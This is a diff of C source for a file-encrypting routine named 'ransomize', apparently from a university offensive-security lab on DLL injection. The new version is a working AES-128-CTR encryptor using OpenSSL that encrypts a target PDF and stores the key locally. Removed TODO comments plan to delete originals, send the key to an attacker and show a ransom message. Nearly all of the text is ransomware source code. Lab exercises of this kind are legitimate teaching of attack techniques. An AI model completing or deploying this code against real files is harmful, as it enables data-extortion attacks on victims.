@@ -1,119 +1,122 @@
-#include <windows.h>
-
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
+#include <string.h>
+#include <stdbool.h>
+
 #include <openssl/evp.h>
+#include <openssl/rand.h>
 
-void ransomize(void)
+#define KEY_SIZE 16
+#define IV_SIZE 16
+
+/* Error handler */
+void handle_error(const char *msg)
 {
-    // TODO: target files
-    const char *input_file = "important.pdf";
-    const char *output_file = "important.enc";
-
-    MessageBoxA(NULL, "Encrypting file", "Ransomware", MB_OK);
-    encypt_file_aes(input_file, output_file);
-    MessageBoxA(NULL, "File encrypted!", "Ransomware", MB_OK);
-
-    // TODO: remove original file
-    // TODO: send the key to the attacker
-    // TODO: display nasty ransom message
+    fprintf(stderr, "Error: %s\n", msg);
+    exit(EXIT_FAILURE);
 }
 
-/*
-    Generate an IV for AES-128 CTR mode. 64 bits is the nonce, 64 buts is the counter initialized to 0.
-*/
+/* Generate a 16-byte IV for AES-128-CTR: 8-byte nonce + 8-byte counter initialized to 0 */
 void make_ctr_iv(unsigned char iv[16])
 {
     uint64_t nonce;
     uint64_t counter = 0;
 
-    // Generate 64-bit random nonce
-    RAND_bytes((unsigned char *)&nonce, sizeof(nonce));
+    if (RAND_bytes((unsigned char*)&nonce, sizeof(nonce)) != 1)
+        handle_error("RAND_bytes failed for nonce");
 
-    // Convert both to big-endian ?
-
-    memcpy(iv, &nonce, 8);
-    memcpy(iv + 8, &counter, 8);
-}
-/*
-
-*/
-void handle_error(void)
-{
-    fprintf(stderr, "Error\n");
-    exit(1);
-}
-/*
-    Encrypt a file using the AES-128 in the CTR mode.
-*/
-int encypt_file_aes(const char *source, const char *target)
-{
-    FILE *infile = NULL;
-    FILE *outfile = NULL;
-
-    // Open files
-    infile = fopen(infile, "rb");
-    if (!infile)
-    {
-        handle_error();
+    //Convert to big-endian for CTR mode
+    for (int i = 0; i < 8; i++) {
+        iv[i] = (nonce >> (56 - i * 8)) & 0xFF;
+        iv[8 + i] = (counter >> (56 - i * 8)) & 0xFF;
     }
-    outfile = fopen(outfile, "rb");
-    if (!outfile)
-    {
-        handle_error();
+}
+
+/* Save generated key to a .bin file */
+int save_key_to_file(const char *path, const unsigned char *key, size_t key_len)
+{
+    FILE *f = fopen(path, "wb");
+    if (!f) return 0;
+
+    if (fwrite(key, 1, key_len, f) != key_len) {
+        fclose(f);
+        return 0;
     }
-    // TODO: check input size 0 ?
 
-    unsigned char key[16];
-    unsigned char iv[16];
+    fclose(f);
+    return 1;
+}
 
-    // Generate random AES-128 key
-    RAND_bytes(key, KEY_SIZE);
-    // Create IV: 64 bits is nonce, 64 bit is for counter initialized at 0.
+/* Encrypt a file with AES-128-CTR */
+int encrypt_file_aes_ctr(const char *source, const char *target)
+{
+    FILE *infile = fopen(source, "rb");
+    if (!infile) handle_error("Cannot open input file");
+
+    FILE *outfile = fopen(target, "wb");
+    if (!outfile) {
+        fclose(infile);
+        handle_error("Cannot open output file");
+    }
+
+    unsigned char key[KEY_SIZE];
+    unsigned char iv[IV_SIZE];
+
+    // Generate random key and IV 
+    if (RAND_bytes(key, KEY_SIZE) != 1) handle_error("RAND_bytes failed for key");
     make_ctr_iv(iv);
 
-    // Write the IV into the file. Maybe in metadata?
-    fwrite(iv, 1, IV_SIZE, out);
+    // Write IV at the start of the file
+    if (fwrite(iv, 1, IV_SIZE, outfile) != IV_SIZE) handle_error("Failed to write IV");
 
+    // Setup encrpytion context
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-    if (!ctx)
-    {
-        handle_error();
-    }
-    // Initialize AES-128-CTR
+    if (!ctx) handle_error("Failed to create EVP context");
+
     if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key, iv))
-    {
-        handle_error();
-    }
+        handle_error("EVP_EncryptInit_ex failed");
 
     /* ENCRYPTION */
-
-    unsigned char inbuff[4096];
-    unsigned char outbuff[4096 + EVP_MAX_BLOCK_LENGTH];
+    unsigned char inbuf[4096];
+    unsigned char outbuf[4096 + EVP_MAX_BLOCK_LENGTH];
     int outlen;
 
-    while (true)
-    {
-        int inbyte = fread(inbuff, 1, sizeof(inbuff), infile);
-        if (inbyte <= 0)
-            break;
-
-        if (1 != EVP_EncryptUpdate(ctx, outbuff, &outlen, inbuff, inbyte))
-        {
-            handle_error();
-        }
-        fwrite(outbuff, 1, outlen, outfile);
+    size_t nread;
+    while ((nread = fread(inbuf, 1, sizeof(inbuf), infile)) > 0) {
+        if (1 != EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, (int)nread))
+            handle_error("EVP_EncryptUpdate failed");
+        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
+            handle_error("Failed to write ciphertext");
     }
 
-    // Finalize. There is no padding due to CTR mode (outlen = 0)
-    if (1 != EVP_EncryptFinal_ex(ctx, outbuff, &outlen))
-    {
-        handle_error();
+    // Finalize
+    if (1 != EVP_EncryptFinal_ex(ctx, outbuf, &outlen))
+        handle_error("EVP_EncryptFinal_ex failed");
+    if (outlen > 0) {
+        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
+            handle_error("Failed to write final block");
     }
-    fwrite(outbuff, 1, outlen, outfile);
 
     // Cleanup
     EVP_CIPHER_CTX_free(ctx);
-    fclose(in);
-    fclose(out);
+    fclose(infile);
+    fclose(outfile);
+
+    // Save the key
+    if (!save_key_to_file("C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/aes_key.bin", key, KEY_SIZE)) handle_error("Failed to save key");
+
+    return 0;
+}
+
+int ransomize(void)
+{
+    const char *input_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.pdf";
+    const char *output_file = "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/important.enc";
+
+    printf("Encrypting file...\n");
+    encrypt_file_aes_ctr(input_file, output_file);
+    printf("File encrypted successfully.\n");
+
+    return 0;
 }
